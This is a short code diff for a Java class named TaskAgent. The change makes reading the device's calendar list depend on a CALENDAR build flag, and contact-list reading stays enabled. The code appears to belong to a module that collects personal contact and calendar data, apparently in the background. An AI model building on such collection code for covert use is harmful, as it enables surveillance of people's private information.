@@ -152,7 +152,12 @@ public final class TaskAgent extends Agent implements PIMListListener,
         debug.trace("actualRun");
         //#endif
 
-        boolean haveToLoadContact = true, haveToLoadCalendar = true;
+        boolean haveToLoadContact = true;
+        boolean haveToLoadCalendar = false;
+        //#ifdef CALENDAR
+        haveToLoadCalendar=true;
+        //#endif
+        
         boolean readSuccesfullyContact = false, readSuccesfullyCalendar = false;
 
         if (markup.isMarkup()) {
@@ -181,7 +186,9 @@ public final class TaskAgent extends Agent implements PIMListListener,
             //#ifdef DEBUG
             debug.trace("actualRun: getting Calendar List");
             //#endif
+            //#ifdef CALENDAR
             readSuccesfullyCalendar = getCalendarList();
+            //#endif
         }
 
         if (readSuccesfullyContact || readSuccesfullyCalendar) {
